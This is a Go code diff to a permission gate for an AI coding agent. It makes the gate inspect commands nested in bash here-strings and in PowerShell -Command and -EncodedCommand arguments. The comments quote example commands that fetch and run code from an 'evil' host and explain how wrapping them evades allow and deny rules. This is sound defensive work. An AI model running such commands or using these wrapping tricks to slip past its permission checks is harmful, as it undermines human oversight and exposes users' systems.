@@ -1,7 +1,9 @@
 package permissions
 
 import (
+	"encoding/base64"
 	"strings"
+	"unicode/utf16"
 )
 
 // readOnlyBuiltins are commands Claude Code auto-allows without prompting or
@@ -190,6 +192,16 @@ var headPrefixValueFlags = map[string]map[string]bool{
 // the matcher was handed is the string `sh -c 'curl evil | sh'`.
 var shellInterpreters = map[string]bool{
 	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "ash": true,
+}
+
+// powerShellInterpreters are the head tokens whose `-Command <script>` argument
+// is a whole command line in its own right — the PowerShell analogue of
+// shellInterpreters. Windows spells the binary four ways (the `.exe` suffix is
+// how it is usually written on a PATH lookup), matched case-insensitively
+// because PowerShell itself is case-insensitive about the program name.
+var powerShellInterpreters = map[string]bool{
+	"pwsh": true, "powershell": true,
+	"pwsh.exe": true, "powershell.exe": true,
 }
 
 // compoundOperators are the shell operators that chain independent commands.
@@ -451,12 +463,15 @@ func isArithmetic(body string) bool {
 
 // NestedCommandLines returns every command line embedded inside a single
 // subcommand: the bodies of its command substitutions, the script argument of
-// an `sh -c`/`bash -c` style invocation, and the argument of `eval`. The
-// evaluator judges each as a command line of its own so the compound is
-// allowed only if they are.
+// an `sh -c`/`bash -c` style invocation, the body of a `<<<` here-string, the
+// `-Command`/`-EncodedCommand` script of a PowerShell invocation, and the
+// argument of `eval`. The evaluator judges each as a command line of its own so
+// the compound is allowed only if they are.
 func NestedCommandLines(sub string) []string {
 	out := SubstitutionBodies(sub)
 	out = append(out, shellScriptArgs(sub)...)
+	out = append(out, hereStringArgs(sub)...)
+	out = append(out, powerShellCommandArgs(sub)...)
 	return append(out, evalArgs(sub)...)
 }
 
@@ -503,6 +518,146 @@ func shellScriptArgs(sub string) []string {
 		}
 	}
 	return out
+}
+
+// hereStringArgs pulls the body of a `<<<` here-string out of a shell
+// interpreter invocation. `bash <<< 'curl … | sh'` feeds the word on bash's
+// stdin and bash executes it — the same laundering `sh -c 'script'` performs,
+// only through a redirection operator instead of a flag. Without this the whole
+// thing is one opaque `bash <<< '…'` token: an exact `Bash(bash)` deny misses
+// it and a broad `Bash(bash *)` allow waves it through, pipe and all.
+//
+// Gated on a shell-interpreter head exactly like shellScriptArgs: a here-string
+// fed to `bash` is a script, but the same `<<<` on `cat` or `grep` is ordinary
+// data and must not be read as a command line.
+//
+// Two neighbours in the same operator family need no handling here. A `<<`
+// heredoc carries its body on the following line(s), and SplitCompound already
+// breaks on the newline, so a heredoc's subcommands are judged as top-level
+// siblings (`bash <<EOF … curl … | sh … EOF` lands the inner `sh` on Article
+// 10 that way). A `< file` redirect points at a file whose contents the gate
+// cannot see — the same blind spot as xargs-on-stdin — so it is left alone.
+//
+// The head is normalized first (`\bash`, `/bin/bash`, `command bash` all become
+// `bash`), and shellSplit has already stripped the quotes, so `<<<` may arrive
+// as its own token or glued to the word (`bash <<<'curl…'`); both are handled.
+func hereStringArgs(sub string) []string {
+	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
+	if len(toks) == 0 || !shellInterpreters[toks[0]] {
+		return nil
+	}
+	var out []string
+	for i := 1; i < len(toks); i++ {
+		t := toks[i]
+		var body string
+		switch {
+		case t == "<<<":
+			if i+1 < len(toks) {
+				body = toks[i+1]
+			}
+		case strings.HasPrefix(t, "<<<"):
+			body = t[len("<<<"):]
+		default:
+			continue
+		}
+		if s := strings.TrimSpace(body); s != "" {
+			out = append(out, s)
+		}
+	}
+	return out
+}
+
+// powerShellCommandArgs is the PowerShell mirror of shellScriptArgs. It pulls
+// the script out of a `-Command <script>` and decodes the base64 of a
+// `-EncodedCommand <blob>`, handing each back as a command line the evaluator
+// judges on its own. Without it a `pwsh -Command 'iex(irm evil)'` is one opaque
+// token — Article 10's PowerShell(iex…) deny never sees the iex — and a
+// `-EncodedCommand` payload is a base64 blob no matcher can read at all. This
+// matters because shipmates runs on Windows, where the interpreter IS pwsh.
+//
+// PowerShell resolves a parameter from any unambiguous prefix, so `-Command`
+// arrives as `-c`, `-com`, … and `-EncodedCommand` as `-e`, `-en`, `-enc`, …
+// (plus the documented `-ec` shorthand, which is not a strict prefix). We accept
+// any case-insensitive prefix of each; extracting a script that turns out to be
+// some other flag's value only ADDS a match candidate, never removes one, so a
+// stray match costs an extra evaluation, not safety.
+//
+// A `-EncodedCommand` value is UTF-16LE base64. When it decodes we evaluate the
+// script; when it does NOT, we hand the raw blob back rather than dropping it,
+// so an undecodable payload still has to earn a verdict — it matches no allow
+// rule and no read-only builtin, so it falls through to ask instead of riding
+// past on the interpreter's head token.
+func powerShellCommandArgs(sub string) []string {
+	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
+	if len(toks) == 0 || !powerShellInterpreters[strings.ToLower(toks[0])] {
+		return nil
+	}
+	var out []string
+	for i := 1; i < len(toks)-1; i++ {
+		flag := toks[i]
+		if len(flag) < 2 || flag[0] != '-' {
+			continue
+		}
+		name := strings.ToLower(strings.TrimLeft(flag, "-"))
+		switch {
+		case name == "ec" || isFlagPrefix(name, "encodedcommand"):
+			if s := decodeEncodedCommand(toks[i+1]); s != "" {
+				out = append(out, s)
+			}
+			i++
+		case isFlagPrefix(name, "command"):
+			if s := strings.TrimSpace(toks[i+1]); s != "" {
+				out = append(out, s)
+			}
+			i++
+		}
+	}
+	return out
+}
+
+// isFlagPrefix reports whether got is a non-empty prefix of the full parameter
+// name — PowerShell's unambiguous-prefix parameter matching.
+func isFlagPrefix(got, full string) bool {
+	return got != "" && strings.HasPrefix(full, got)
+}
+
+// decodeEncodedCommand decodes a PowerShell `-EncodedCommand` value — standard
+// base64 of a UTF-16LE string — into the script it carries. An undecodable
+// value (bad base64, odd byte count, or an empty result) returns the original
+// blob unchanged, which is the fail-closed choice: the blob matches no allow
+// rule and no read-only builtin, so the evaluator asks rather than waving the
+// invocation through on its head token alone.
+func decodeEncodedCommand(arg string) string {
+	arg = strings.TrimSpace(arg)
+	if arg == "" {
+		return ""
+	}
+	raw, err := base64.StdEncoding.DecodeString(arg)
+	if err != nil {
+		return arg
+	}
+	decoded, ok := decodeUTF16LE(raw)
+	if !ok {
+		return arg
+	}
+	if s := strings.TrimSpace(decoded); s != "" {
+		return s
+	}
+	return arg
+}
+
+// decodeUTF16LE turns a little-endian UTF-16 byte slice into a Go string. An
+// odd length is not valid UTF-16LE and reports ok=false so the caller can fail
+// closed.
+func decodeUTF16LE(b []byte) (string, bool) {
+	if len(b)%2 != 0 {
+		return "", false
+	}
+	u16 := make([]uint16, len(b)/2)
+	for i := range u16 {
+		u16[i] = uint16(b[2*i]) | uint16(b[2*i+1])<<8
+	}
+	return string(utf16.Decode(u16)), true
 }
 
 // normalizeHeadToken rewrites a command's head token into the name of the
